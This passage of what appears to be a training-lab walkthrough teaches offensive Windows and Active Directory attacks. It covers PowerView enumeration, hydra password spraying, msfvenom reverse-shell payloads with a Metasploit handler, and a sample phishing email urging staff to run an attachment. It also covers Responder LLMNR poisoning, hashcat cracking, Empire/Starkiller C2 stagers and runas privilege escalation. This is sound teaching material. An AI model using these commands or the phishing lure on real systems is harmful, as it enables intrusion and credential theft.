properties.</p><p>The general format using this cmdlet is<br><code>Verb-Noun | Where-Object -Property PropertyName -operator Value</code><br><code>Verb-Noun | Where-Object &#123;$_.PropertyName -operator Value&#125;</code></p><p>The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.</p><blockquote><p>   Where -operator is a list of the of the following operators.<br>    Contains - If any item in the property value is an exact match for the specified value/<br>    EQ - If the property value is the same as the specified value.<br>    GT - If the property value is greater than the specified value</p></blockquote><p>For a full list of operators, use this <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.1&viewFallbackFrom=powershell-6">link</a>.</p><p>Here’s an example of checking the stopped processes:</p><div style="text-align:center">    <img src="https://i.imgur.com/g3OLpVd.png"></div><blockquote><p>Get-Service | Where-Object -Property Status -eq Stopped</p></blockquote><h3 id="Sort-Object"><a href="#Sort-Object" class="headerlink" title="Sort Object"></a>Sort Object</h3><p>When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.<br>The format of the command would be<br><code>Verb-Noun | Sort-Object</code></p><p>Here’s an example of sorting the list of directories.</p><div style="text-align:center">    <img src="https://i.imgur.com/MjuV6kq.png"></div><blockquote><p>Get-ChildItem | Sort-Object</p></blockquote><p>Now that we understand the basics of Powershell we can get to offensively using Powershell to enumerate and exploit.</p><h2 id="Introduction-to-Offensive-Powershell"><a href="#Introduction-to-Offensive-Powershell" class="headerlink" title="Introduction to Offensive Powershell"></a>Introduction to Offensive Powershell</h2><p>Well we have all this information now how can we apply it to attacking a windows network? We can utilize offensive powershell to enumerate and attack Windows and Windows Active Directory.<br>Basic Offensive Powershell<br>A majority of offensive Powershell will come from using Modules like ActiveDirectory and PowerView to enumerate and exploit however powershell also has a few cmdlets that you can use to your offensively.</p><h3 id="Using-Modules-in-Powershell"><a href="#Using-Modules-in-Powershell" class="headerlink" title="Using Modules in Powershell"></a>Using Modules in Powershell</h3><p>Powershell has the ability to import modules such as ActiveDirectory and PowerView to expand the list of cmdlets available. To import a module you can either use Import-Module <Module> or you can use dot space dot backslash <em><Module> (. .\Module)</em>.<br>Examples of importing modules</p><pre><code>    Import-Module Module    . .\Module.ps1    </code></pre><blockquote><p>Note: . .\ will only work with powershell script files. All other modules will need to be imported with Import-Module for example ActiveDirectory can only be imported with Import-Module.</p></blockquote><h3 id="Get-ADDomain"><a href="#Get-ADDomain" class="headerlink" title="Get-ADDomain"></a>Get-ADDomain</h3><p>Get-ADDomain is a commandlet that pulls a large majority of the information about the Domain you’re attacking. It can list all of the Domain Controllers for a given environment, tell you the NetBIOS Domain name, the FQDN (Fully Qualified Domain name) and much more. Using the Select-Object command, we can filter out some of the unnecessary objects that may be displayed (like COntainers, Group Policy Objects, and much more)</p><pre><code>Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster</code></pre><div style="text-align:center">    <img src="https://i.imgur.com/NZ0d5KB.png"></div><blockquote><p>Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastrucuteMaster</p></blockquote><h3 id="Get-ADForest"><a href="#Get-ADForest" class="headerlink" title="Get-ADForest"></a>Get-ADForest</h3><p>Get-ADForest is another commandlet that pulls all the Domains within a Forest and lists them out to the user. This may be useful if a bidirectional trust is setup, it may allow you to gain a foothold in another domain on the LAN. Just like Get-ADDomain, there is a lot of output, so we will be using Select-Object to trim the output down</p><p><code>Get-ADForest | Select-Object Domains </code></p><div style="text-align:center">    <img src="https://i.imgur.com/rkwT7sZ.png"></div><blockquote><p>Get-ADForest | Select-Object Domains</p></blockquote><h3 id="Get-ADTrust"><a href="#Get-ADTrust" class="headerlink" title="Get-ADTrust"></a>Get-ADTrust</h3><p>Get-ADTrust is the last built in Powershell commandlet that we will be discussing, after this, we will move over to Powerview. Get-ADTrust provides a ton of information about the Trusts within the AD Domain. It can tell you if it’s a one way or bidirectional trust, who the source is, who the target is, and much more. One required field is -Filter, this is required in the event that you want to filter on a specific Domain/Trust, if you do not (like in most circumstances), you can simply provide a * to wildcard the results.</p><p><code>Get-ADTrust -Filter * | Select-Object Direction,Source,Target</code></p><div style="text-align:center">    <img src="https://i.imgur.com/6YZMH1W.png"></div><blockquote><p>Get-ADTrust -Filter * | Select-Object Direction,Source,Target</p></blockquote><h2 id="Introduction-to-PowerView"><a href="#Introduction-to-PowerView" class="headerlink" title="Introduction to PowerView"></a>Introduction to PowerView</h2><p>Powerview (part of PowerSploit by <a href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia</a>) is an excellent suite of tools that can be used for enumeration, and exploitation of an AD Domain, today we’re only going to cover Powerview’s ability to enumerate information about the domain and their associated trusts, you can get the .ps1. </p><h3 id="Get-NetDomain"><a href="#Get-NetDomain" class="headerlink" title="Get-NetDomain"></a>Get-NetDomain</h3><p>Get-NetDomain is similar to the ActiveDirectory module’s Get-ADDomain but contains a lot less information, which can be better. Basic info such as the Forest, Domain Controllers, and Domain Name are enumerated.</p><p><code>Get-NetDomain</code></p><div style="text-align:center">    <img src="https://i.imgur.com/LU79AbT.png"></div><blockquote><p>Get-NetDomain</p></blockquote><h3 id="Get-NetDomainController"><a href="#Get-NetDomainController" class="headerlink" title="Get-NetDomainController"></a>Get-NetDomainController</h3><p>Get-NetDomainController is another useful cmdlet that will list all of the Domain Controllers within the network. This is incredibly useful for initial reconnaissance, especially if you do not have a Windows device that’s joined to the domain.</p><p><code>Get-NetDomainController    </code></p><div style="text-align:center">    <img src="https://i.imgur.com/UAbLxXi.png"></div><blockquote><p>Get-NetDomainControllers</p></blockquote><h3 id="Get-NetForest"><a href="#Get-NetForest" class="headerlink" title="Get-NetForest"></a>Get-NetForest</h3><p>Get-NetForest is similar to Get-ADForest, and provides similar output. It provides all the associated Domains, the root domain, as well as the Domain Controllers for the root domain.</p><p><code>Get-NetForest</code> </p><div style="text-align:center">    <img src="https://i.imgur.com/wqNggGh.png"></div><blockquote><p>Get-NetForest</p></blockquote><h3 id="Get-NetDomainTrust"><a href="#Get-NetDomainTrust" class="headerlink" title="Get-NetDomainTrust"></a>Get-NetDomainTrust</h3><p>Get-NetDomainTrust is similar to Get-ADTrust with our SelectObject filter applied to it. It’s short, sweet and to the point!</p><pre><code>Get-NetDomainTrust</code></pre><div style="text-align:center">    <img src="https://i.imgur.com/zzpdUd5.png"></div><blockquote><p>Get-NetDomainTrust</p></blockquote><h1 id="Scanning-the-World-with-nmap"><a href="#Scanning-the-World-with-nmap" class="headerlink" title="Scanning the World with nmap"></a>Scanning the World with nmap</h1><p>nmap is a commonly used port scanning tool that is an industry standard that is both fast and comes with NSE scripts. nmap also supports CIDR notation so we can specify a /24 to specify 254 hosts.<br>We can specify how we want to scan the hosts using switches.</p><pre><code>    sV determines service and version of open ports    sC runs a script scan against the found ports    -p- scans all ports 0-65535    -v runs the scan in verbose mode</code></pre><pre><code class="bash=">nmap -sV -sC -p- -v 10.200.x.0/24 --min-rate 5000    </code></pre><p>This nmap command is fairly stable and will scan the entire network in a couple of minutes. You may need to specify the min rate to be lower, as it affects the minimum number of packets that nmap sends. If too high it can miss ports or cause false positives.</p><h1 id="Password-Spraying-Overview"><a href="#Password-Spraying-Overview" class="headerlink" title="Password Spraying Overview"></a>Password Spraying Overview</h1><p>Password spraying is using one password to attempt to log in to a list of users typically with a common weak password. There are many tools to automate password spraying on multiple attack vectors. You can easily test an environment for weak passwords by password spraying a list of all their users.</p><h1 id="Common-Weak-Passwords"><a href="#Common-Weak-Passwords" class="headerlink" title="Common Weak Passwords"></a>Common Weak Passwords</h1><p>In a realistic environment humans are the weakest link, if the environment has a weak password policy then often times you can spray for common weak password based upon various conditions of the year for example if the year was 2020 and the season was Fall then a common weak password that you could spray for would be Fall2020.</p><p>Some examples of weak passwords: </p><pre><code class="txt">    Summer2020    Management2020    Management2018    Password2020    &lt;company&gt;2020    Password123</code></pre><h1 id="Finding-the-Attack-Surface"><a href="#Finding-the-Attack-Surface" class="headerlink" title="Finding the Attack Surface"></a>Finding the Attack Surface</h1><p>The attack surface for password spraying is fairly broad, all you need is a field to submit a username and a password and you can password spray against that login. Even if there is not a login portal you can still sometimes password spray against it, for example we can password spray active directory users with kerbrute. Having a broad attack surface makes password spraying a commonly used attack vector in many red team engagements. The only hard part about finding our attack surface is finding the parameters of the request. This can either be done by submitting a test login and seeing what the parameters are, however, this does not always work so instead what we can do is use burp to intercept our request and see what the request parameters are.</p><p>1.) We need to send a request to burp with dummy data in the user and password fields to identify where the request parameters are.</p><div style="text-align:center">    <img src="https://i.imgur.com/CQSSEtf.png"></div><blockquote><p>Capturing the request with burp to extract the parameters</p></blockquote><p>We can now use these parameters in hydra to make requests to the website with a user list and a password.<br>In order to password spray you will need a list of users, you can get the contact list from the guest account and utilize the names from it as a user list.</p><h2 id="Password-Spraying-with-Hydra"><a href="#Password-Spraying-with-Hydra" class="headerlink" title="Password Spraying with Hydra"></a>Password Spraying with Hydra</h2><p>Hydra is typically used as a web application login portal brute force tool however it can also be used to password spray against a login portal. You only have to supply the IP, Password, and User list. A password list is optional however you can make a small list of common passwords within the company and use it to spray with</p><pre><code class="bash=">hydra -L users.txt -p &lt;password&gt; MACHINE_IP http-post-form &#39;/src/redirect.php:&lt;user_parameter&gt;=^USER^&amp;&lt;pass_parameter&gt;=^PASS^:F=incorrect&#39; -v</code></pre><div style="text-align:center">    <img src="https://i.imgur.com/k2wTmQh.png"></div><blockquote><p>Password spraying the target with Hydra</p></blockquote><p>If you successfully password sprayed you will now have a user account or two that you have fully compromised allowing you to view company emails and potentially gain further access into the network.</p><h2 id="Phishing-Overview"><a href="#Phishing-Overview" class="headerlink" title="Phishing Overview"></a>Phishing Overview</h2><p>Phishing is a broad topic that can seem intimidating at first. We are going to take a brief look at the simplest form of phishing: Attaching an exe to an email and having a user execute that file, granting us a reverse shell. This can be done using msfvenom to create the payload as well as with other tools along with msfvenom to obfuscate the payload.</p><h2 id="Identifying-Targets"><a href="#Identifying-Targets" class="headerlink" title="Identifying Targets"></a>Identifying Targets</h2><p>Before we send out phishing emails we first need to identify our targets since we have a specific goal in mind. We want to target employees at Throwback Hacks. We can find employees from the contact list of the guest account that we compromised earlier when enumerating web servers we can also send emails from the guest account as a trusted email within the domain.</p><h2 id="Payloads-101"><a href="#Payloads-101" class="headerlink" title="Payloads 101"></a>Payloads 101</h2><p>The metasploit framework is a massive suite of tools that we’re only going to scratch the surface of with this course. In this section we’re going to focus on generating payloads using msfvenom. But before we dive into generating payloads, we need to learn a little bit more about types of payloads.</p><h2 id="Staged-and-Stageless-Payloads"><a href="#Staged-and-Stageless-Payloads" class="headerlink" title="Staged and Stageless Payloads"></a>Staged and Stageless Payloads</h2><p>Differentiating between Staged and Stageless payloads can be difficult at first, it sounds and seems really complex until you learn the difference between the two. Lets dive into them.<br>Staged Payloads require a handler to catch the payload and send the appropriate response back to the server to trigger your reverse shell.<br>Stageless Payloads do not require any specific handler. A reverse shell can be caught with a utility like netcat, socat, or many others.</p><h2 id="Difference-in-Staged-vs-Stageless-Payloads"><a href="#Difference-in-Staged-vs-Stageless-Payloads" class="headerlink" title="Difference in Staged vs. Stageless Payloads"></a>Difference in Staged vs. Stageless Payloads</h2><p>Telling the difference between staged and stageless payload in msfvenom is relatively trivial. First you need to list all the available payload within msfvenom using one of the following command.</p><pre><code class="bash=">msfvenom --list payloadmsfvenom -l payloads    </code></pre><p>The output can be overwhelming, msfvenom has upwards of 500+ payloads that you can utilize piping the command into grep and narrowing down your search (by Operating System) can majorly reduce the amount of payloads returned.</p><div style="text-align:center">    <img src="https://i.imgur.com/pauUTtm.png"></div><blockquote><p>Listing and Filtering msfvenom’s payloads</p></blockquote><p>In the screenshot above you notice two similar looking payloads.</p><pre><code class="bash">windows/x64/shell/reverse_tcp    Spawn a piped command shell (staged). Connect back to the attackerWindows/x64/shell_reverse_tcp    Connect back to attacker and spawn a command shell    </code></pre><p>There is a minor difference between the two, the top payloads is staged payload (as stated by the description), but, metasploit also has naming convention. The top payload has three slashes which indicate it’s a staged payload. The bottom payload which is stageless has two slashes. Additionally, the bottom payload has two underscores, while the top payload only has one.<br>Knowing metasploit’s naming convention on staged vs. stageless payload, we already know we will be using the windows/meterpreter/reverse_tcp payload to generate our payload, but before that we should take the time to verify. We can do this by listing msfvenom’s payloads and grep for the prior mentioned payload.</p><div style="text-align:center">    <img src="https://i.imgur.com/kfgCc0W.png"></div><p>Confirming windows/meterpreter/reverse_tcp is a staged payload</p><p>The description does indeed indicate that it is staged payload. After we generate the payload, we’ll setup our handler that will be used to catch our shell.</p><blockquote><p>Note: All meterpreter payloads will require a handler no matter what.</p></blockquote><h3 id="Which-Payload-Where"><a href="#Which-Payload-Where" class="headerlink" title="Which Payload Where"></a>Which Payload Where</h3><p>So far, stageless payloads sound like the best payloads to use for any given task, right?<br>Well, no. That’s not always the case. Stageless payloads by design are larger because they contain everything required to land a reverse shell back on your box in a nice and neat style. This can be a disadvantage for several reasons (which are reasons that you would want to used a staged payload for).<br>There are several reasons you might want to use a staged payload, for example.</p><ul><li>You could use it when your’re limited on space in a SEH Based Buffer Overflow, or Stack Based Buffer Overflow.</li><li>You could use it in conjunction with Anti-Virus evasion techniques to sleep for a given period of time to escape a sandbox and malware scans that might detect your payload. Afterwards, reach out to your Handler for the rest of the payload.</li><li>Additionally, you can also use Staged payloads to gain additional functionality within your shell (like Meterpreter) and is the biggest reason that you would want to use a Staged payload.</li></ul><blockquote><p><strong>Note</strong>: Even with some Stageless payloads, to get certain features (like Meterpreter) to work , you will need a Handler. If you’re going to setup a Handler anyways, you might as well make it a Staged Payload, right?</p></blockquote><h3 id="Generating-Payloads"><a href="#Generating-Payloads" class="headerlink" title="Generating Payloads"></a>Generating Payloads</h3><p>In this portion of the course, we will be using a staged meterpreter payload due to it’s additional functionality. In order to generate our payload, we can use msfvenom with -p to select our payload, followed by a LHOST variable and a LPORT variable to tell msfvenom what interface/port to listen on. Lastly, we’ll follow up with the -f flag to tell msfvenom what format we would like the shellcode to be in. We will be using exe for this example. Putting this all together, we can get a nice command that looks like so.</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o NotAShell.exe    </code></pre><div style="text-align:center">    <img src="https://i.imgur.com/jm84QYX.png"></div><blockquote><p>Statistics after generating a meterpreter payload</p></blockquote><h3 id="Setting-up-your-Handler"><a href="#Setting-up-your-Handler" class="headerlink" title="Setting up your Handler"></a>Setting up your Handler</h3><p>Metasploit makes setting up handlers incredibly easy, after generating your payload, we need to spin up msfconsole and use the exploit/multi/handler module. Next you’ll need to set several variables, the payload variable, the LHOST variables, and the LPORT variable to the values you selected in the Generating Payloads sections. After that, you can execute your task run or exploit (the -j flag is optional and indicated that it will be running as a job in the background in the even you’re expecting more than one reverse shell to come).</p><pre><code class="bash=">msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LPORT set LHOST tun0exploit -j    </code></pre><div style="text-align:center">    <img src="https://i.imgur.com/L8NgCWO.png"></div><blockquote><p>Setting the required variables and running the handler</p></blockquote><p>After getting your handler successfully configure, you’re ready to proceed on and learn a little bit about how to phish.</p><h1 id="Catching-Some-Phish"><a href="#Catching-Some-Phish" class="headerlink" title="Catching Some Phish"></a>Catching Some Phish</h1><h2 id="Creating-your-Phishing-Email"><a href="#Creating-your-Phishing-Email" class="headerlink" title="Creating your Phishing Email"></a>Creating your Phishing Email</h2><p>Creating an effective phishing email may appear daunting at first, however, we’ll see that this requires only a cursory understanding of social engineering and the basics of business email composition. Consider this, we have two goals with phishing attacks:</p><ol><li>   Stay under our target’s radar such that the email does not come across as suspicious</li><li>   Prompt our target into action through either filling out some form (typically resulting in them providing us passwords) or through the execution of our payload</li></ol><p>This requires us to write an email that has the following:</p><ol><li>   Correct grammar and punctuation</li><li>   Prompts the user to action</li><li>   Setting a deadline for action</li><li>   Makes sense within the business context</li></ol><p>Here’s a brief example of what might constitute an effective phishing email:</p><pre><code>Hey everyone,We’re releasing an update for our note-taking software. In order to keep using the software, you must perform this update prior to next Friday. Please run the attached file to this email to complete this action.Thank you for your patience in this update.IT Support</code></pre><p>Note how we accomplished our goals in providing a situation wherein the email not only makes sense to our target but also prompts them into action with a set deadline.</p><p>If you successfully created a payload and sent out a convincing enough email you may get lucky and an employee will click on your attachment and execute your payload. Send phishing emails to all employees at Throwback Hacks and wait a couple of minutes to see if you get back a shell.</p><h2 id="LLMNR-NBT-NS-Overview"><a href="#LLMNR-NBT-NS-Overview" class="headerlink" title="LLMNR/NBT-NS Overview"></a>LLMNR/NBT-NS Overview</h2><p>To fully understand how the LLMNR poisoning attack works we first need to understand how LLMNR and NBT-NS work and why they are a part of Windows active directory. The Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Windows domain services that act as an alternative method for host identification. You can think of LLMNR like DNS: it allows hosts on the same network to use name resolution for other hosts. NBT-NS is used to identify systems on a network by their NetBIOS name.</p><h2 id="LLMNR-Poisoning-Overview"><a href="#LLMNR-Poisoning-Overview" class="headerlink" title="LLMNR Poisoning Overview"></a>LLMNR Poisoning Overview</h2><p>You can spoof the source for name resolution on a victim network using responder, a tool used to respond to LLMNR and NBT-NS requests acting as though you know the identity of the host. “Poisoning” the service so that the victims will communicate with our machine. If the host belongs to a resource that requires identification the user and their NTLMv2 hash will be sent to the attacker. These hashes can then be collected from responder and taken offline to be cracked and then used to access the poisoned user’s machines or can be taken into PSExec to get a shell.</p><h2 id="Poisoning-LLMNR-with-Responder"><a href="#Poisoning-LLMNR-with-Responder" class="headerlink" title="Poisoning LLMNR with Responder"></a>Poisoning LLMNR with Responder</h2><pre><code class="bash=">sudo responder -I tun0 -rdw -v </code></pre><p>responder’s default settings are set up to poison LLMNR and NBT-NS so all we have to do is set the IP to our tun0 network the r switch enables netbios wredir suffix queries, the d switch enables netbios domain suffix queries, the w switch starts the wpad rogue proxy server, and the v switch makes responder more verbose.</p><div style="text-align:center">    <img src="https://i.imgur.com/r0oEiGj.png"></div><p>After some time you may get a response back from responder, it can take anywhere from a couple of minutes to an hour to get back a response however on an active network it shouldn’t take more than a few minutes.</p><div style="text-align:center">    <img src="https://i.imgur.com/m9DxSMw.png"></div><blockquote><p>Here we can see that responder has garnered a password hash of an Admin</p></blockquote><p>Now that we’ve gained a password hash, let’s attempt to crack it with hashcat. </p><h2 id="Troubleshooting"><a href="#Troubleshooting" class="headerlink" title="Troubleshooting"></a>Troubleshooting</h2><p>If you have gotten to this point and you are still having issues, there are a couple of things that you can do to verify that you have everything correctly configured.</p><ol><li>Within /etc/responder/Responder.conf you should have SMB set to On. You can verify it with the following command: </li></ol><pre><code>cat /etc/responder/Responder.conf | grep SMBSMB = On</code></pre><p>If this is not set to On, edit /etc/responder/Responder.conf and change the value from “Off” to “On”.</p><ol start="2"><li>Ensure you are listening on your tun0 interface. If you have not done so already, execute the following command:</li></ol><p><code>responder -I tun0</code></p><p>This will set Responder to listen on your tun0 interface for all inbound SMB requests. This is required to catch the inbound LLMNR requests.</p><h2 id="Overview-of-Password-Cracking"><a href="#Overview-of-Password-Cracking" class="headerlink" title="Overview of Password Cracking"></a>Overview of Password Cracking</h2><p>Password cracking uses a password cracking tool such as Hashcat or John the Ripper along with a password wordlist such as rockyou.txt to crack a hash. Hashcat relies heavily on utilizing the GPU to crack hashes and is not recommended to be run inside of a VM. John the Ripper utilizes the CPU primarily and can be used inside of a VM.</p><div style="text-align:center">    <img src="https://i.imgur.com/bZ1WTPi.png"></div><blockquote><p>Note: This section of the course along with other areas that use password cracking will require the use of Hashcat, if your device does not support Hashcat then you can utilize google colab to crack for you. Colabcat can be found. </p></blockquote><h2 id="Password-Hash-Types"><a href="#Password-Hash-Types" class="headerlink" title="Password Hash Types"></a>Password Hash Types</h2><p>Inside of a Windows active directory environment there are 5 different types of hashes that you will commonly encounter. The first hash type is NetNTLM and NetNTLMv2 usually seen in LLMNR Poisoning attacks, the Hashcat mode for NetNTLMv2 is 5600. Another widely used hash is NTLM mainly used when dumping credentials, the Hashcat mode is 1000. When trying to identify a hash the Hashcat example hashes can help a lot.</p><h2 id="Cracking-NTLM-Hashes-with-Hashcat"><a href="#Cracking-NTLM-Hashes-with-Hashcat" class="headerlink" title="Cracking NTLM Hashes with Hashcat"></a>Cracking NTLM Hashes with Hashcat</h2><p><code>hashcat -m 1000 -a 0 hash.txt rockyou.txt</code></p><p><img src="https://i.imgur.com/UEBSi9n.png"></p><blockquote><p>Hashcat NTLM hash command</p></blockquote><h1 id="Introduction-to-Rule-Based-Cracking"><a href="#Introduction-to-Rule-Based-Cracking" class="headerlink" title="Introduction to Rule Based Cracking"></a>Introduction to Rule Based Cracking</h1><p>Sometimes your standard wordlist like rockyou is not enough to crack a hash. You can use a rule list to change the wordlist and add rules to it in order to crack a hash. A rule list works by having a set of rules that can append characters to a password, attach characters, and substitute words and characters. </p><p>Append Rule: appending to a word uses a $ operator before the character to append with.</p><p>Examples of Append Rule:</p><pre><code>    $1    $2    $a</code></pre><p>Attach Rule: Attaching to a word uses a ^ operator before the character to attach with.<br>Examples of Attach Rule:</p><pre><code>    ^1    ^2    ^a</code></pre><p>Substitute Rule: Substituting a word or character uses an s, followed by the character you want to substitute, followed by the character to be substituted.<br>Examples of Substitute Rule:</p><pre><code>    sa@    sa4    sl1</code></pre><p>To make rule based attacks easier you can use a pre-compiled rule list. The one we will run the demo with is OneRuleToRuleThemAll, it is a large rule list that contains more 50,000 rules making it much more effective than creating your own list</p><h3 id="Using-Rules-to-Conquer-NetNTLMv2"><a href="#Using-Rules-to-Conquer-NetNTLMv2" class="headerlink" title="Using Rules to Conquer NetNTLMv2"></a>Using Rules to Conquer NetNTLMv2</h3><p>Hashcat uses the -r switch to specify the use of a rules list; you can also add <strong>–debug-mode=1</strong> and <strong>–debug-file=matched.rule</strong> to your command.</p><pre><code class="bash=">hashcat -m 5600 hash.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule    </code></pre><div style="text-align:center">    <img src="https://i.imgur.com/TQIRwN1.png"></div><blockquote><p>Hashcat command with a rules list</p></blockquote><div style="text-align:center">    <img src="https://i.imgur.com/6RDEWk8.png"></div><blockquote><p>Hashcat cracked password with a rules list</p></blockquote><h1 id="Command-and-Control-Server-Overview"><a href="#Command-and-Control-Server-Overview" class="headerlink" title="Command and Control Server Overview"></a>Command and Control Server Overview</h1><p>A command and control server is used as an interface to upload and control various post-exploitation tools without interacting with the target itself. Consider C2 as a means for mass-management of exploited targets for further usage - be it lateral movement, information gathering, or otherwise. </p><h2 id="Installing-Starkiller"><a href="#Installing-Starkiller" class="headerlink" title="Installing Starkiller"></a>Installing Starkiller</h2><pre><code class="bash=">cd /opt# Download an up to date version of starkiller from the BC-Security Github repo - https://github.com/BC-SECURITY/Starkiller/releases chmod +x starkiller-1.3.2.AppImagesudo ./starkiller-1.3.2.AppImage --no-sandbox    </code></pre><h2 id="Installing-Empire"><a href="#Installing-Empire" class="headerlink" title="Installing Empire"></a>Installing Empire</h2><pre><code class="bash=">cd /optgit clone https://github.com/BC-SECURITY/Empire.gitcd Empire    sudo ./setup/install.sh    </code></pre><h2 id="Setting-Up-Starkiller"><a href="#Setting-Up-Starkiller" class="headerlink" title="Setting Up Starkiller"></a>Setting Up Starkiller</h2><pre><code class="bash=">cd /optcd Empiresudo ./empire --restcd ..sudo ./starkiller-1.3.2.AppImage --no-sandbox    #Login to Starkiller</code></pre><blockquote><p>Default Credentials:<br>    uri: 127.0.0.1:1337<br>    user: empireadmin<br>    pass: password123</p></blockquote><div style="text-align:center">    <img src="https://i.imgur.com/zIFyO7D.png"></div><p>If you properly setup Starkiller and Empire you will be met with a listeners panel after logging in.</p><div style="text-align:center">    <img src="https://i.imgur.com/UXTNTjE.png"></div><blockquote><p>Starkiller Landing Page</p></blockquote><h2 id="Uploading-a-C2-agent-with-Starkiller"><a href="#Uploading-a-C2-agent-with-Starkiller" class="headerlink" title="Uploading a C2 agent with Starkiller"></a>Uploading a C2 agent with Starkiller</h2><p>Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent. The stager is like a payload that you send to the target to get an agent back.</p><h3 id="Creating-our-Listener"><a href="#Creating-our-Listener" class="headerlink" title="Creating our Listener"></a>Creating our Listener</h3><p>Go to the listeners tab and select CREATE LISTENER.</p><div style="text-align:center">    <img src="https://i.imgur.com/XpOvrlx.png"></div><blockquote><p>Selecting the ‘CREATE LISTENER’ button within Starkiller</p></blockquote><p>Select your listener type, for our demo, we’ll use an http listener.</p><div style="text-align:center">    <img src="https://i.imgur.com/hUCPAUY.png"></div><blockquote><p>Selecting our listener type, in this case, http</p></blockquote><p>Configure your listener, the only two options you will need to change are the host IP and the host port.</p><div style="text-align:center">    <img src="https://i.imgur.com/xIBs8Gy.png"></div><blockquote><p>Configuring the listener</p></blockquote><p>After pressing submit we now have an active listener on port 53.</p><div style="text-align:center">    <img src="https://i.imgur.com/CVnFLh6.png"></div><blockquote><p>A list of our active listeners</p></blockquote><h3 id="Generating-the-Stager"><a href="#Generating-the-Stager" class="headerlink" title="Generating the Stager"></a>Generating the Stager</h3><p>Go to the stagers tab and select GENERATE STAGER.</p><div style="text-align:center">    <img src="https://i.imgur.com/QRIAdyU.png"></div><blockquote><p>Selecting ‘GENERATE STAGER’ within Starkiller</p></blockquote><p>Select your stager type, for our demo, we’ll use windows/launcher_bat.</p><div style="text-align:center">    <img src="https://i.imgur.com/Mk2uyBD.png"></div><blockquote><p>Selecting the stager type to use</p></blockquote><p>Set the listener to the listener we made previously.</p><div style="text-align:center">    <img src="https://i.imgur.com/DEFaoAJ.png"></div><blockquote><p>Configuring our stager</p></blockquote><p>We now have a stager ready to deploy to our target depending on the stager type you selected you will have to either download or copy and paste the stager to the target machine.</p><div style="text-align:center">    <img src="https://i.imgur.com/toYrqWR.png"></div><blockquote><p>Listing our stagers</p></blockquote><p>Transferring &amp; Executing the Stager</p><p>After executing the batch file if you correctly setup your listener and stager then an agent will check back in the agents tab.</p><div style="text-align:center">    <img src="https://i.imgur.com/cokz55Y.png"></div><blockquote><p>Starkiller agent panel</p></blockquote><p>A red agent means that the agent is not responding with the c2 server. An agent with a black color or no color means that the agent has successfully connected back to the c2 server and is actively responding.</p><p>Now that we have an agent on the machine responding with Starkiller we can explore the command interface of Starkiller as well as the modules that Starkiller has.</p><h3 id="Agent-Panel-Overview"><a href="#Agent-Panel-Overview" class="headerlink" title="Agent Panel Overview"></a>Agent Panel Overview</h3><div style="text-align:center">    <img src="https://i.imgur.com/FRLSuTC.png"></div><blockquote><p>Agent interaction menu</p></blockquote><p>The agent can send any normal shell commands such as whoami or ls, however that is not utilizing the full power of Starkiller.</p><h3 id="Starkiller-Modules-Overview"><a href="#Starkiller-Modules-Overview" class="headerlink" title="Starkiller Modules Overview"></a>Starkiller Modules Overview</h3><p>One of the major features of any c2 server is the ability to use modules. These are typically tools or exploits like mimikatz, Rubeus, and printspooder that can be loaded onto the server through the agent.</p><div style="text-align:center">    <img src="https://i.imgur.com/3A8imhp.png"></div><blockquote><p>Starkiller module menu</p></blockquote><p>Starkiller has many modules, all their own uses. Take some time to explore the modules menu and play with some of the modules.</p><h3 id="Starkiller-Credentials-and-Reporting-Overview"><a href="#Starkiller-Credentials-and-Reporting-Overview" class="headerlink" title="Starkiller Credentials and Reporting Overview"></a>Starkiller Credentials and Reporting Overview</h3><p>Starkiller is great for saving information and logging actions because it will automatically save all credentials that are found through the modules or credentials that you add manually. Starkiller will also report all shell command and modules run on an agent.</p><div style="text-align:center">    <img src="https://i.imgur.com/hhKWPeo.png"></div><blockquote><p>Starkiller credentials panel</p></blockquote><div style="text-align:center">    <img src="https://i.imgur.com/eTheIe9.png"></div><blockquote><p>Starkiller reporting panel</p></blockquote><h3 id="Loading-and-Executing-the-Module"><a href="#Loading-and-Executing-the-Module" class="headerlink" title="Loading and Executing the Module"></a>Loading and Executing the Module</h3><blockquote><p><strong>Note</strong>: The purpose of this task is to show you how to load and execute tasks using Starkiller. In order for Seatbelt (and the Privilege Escalation) to work properly, you should run Seatbelt over an RDP Session using the pre-compiled binary that can be found here:<br><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></p></blockquote><p>We can use use the seatbelt module within Starkiller to help enumerate the device and find potential attack vectors.</p><p>The module for seatbelt is powershell/situational_awareness/host/seatbelt</p><div style="text-align:center">    <img src="https://i.imgur.com/cknD2gk.png"></div><blockquote><p>Loading the seatbelt module in Starkiller</p></blockquote><p>This particular modules has no field that needs to be set so we can simply submit the module and execute it.</p><p>Press Submit </p><div style="text-align:center">    <img src="https://i.imgur.com/mEzEyZf.png"></div><blockquote><p>Enumerating the device with seatbelt</p></blockquote><p>Now that seatbelt has run its safety checks we can look through the output and see if there is anything immediately obvious.</p><h3 id="Searching-Seatbelt-Output"><a href="#Searching-Seatbelt-Output" class="headerlink" title="Searching Seatbelt Output"></a>Searching Seatbelt Output</h3><p>From seatbelt we can see that there may be a user account that has credentials stored within the credentials manager. We can abuse this feature to use saved creds to run a file with the accounts privileges.</p><h3 id="Exploiting-Credentials-Manager"><a href="#Exploiting-Credentials-Manager" class="headerlink" title="Exploiting Credentials Manager"></a>Exploiting Credentials Manager</h3><p>Since we know that there are saved credentials within the credentials manager from seatbelt we can utilize the windows ‘runas’ to run a file as an elevated user and escalate privileges.</p><blockquote><p><em>Note</em>: You will need an rdp session on the device in order to successfully run this command and escalate privileges.</p></blockquote><pre><code>runas /savecred /user:&lt;user&gt; /profile &quot;cmd.exe&quot; </code></pre><h1 id="Mimikatz-Overview"><a 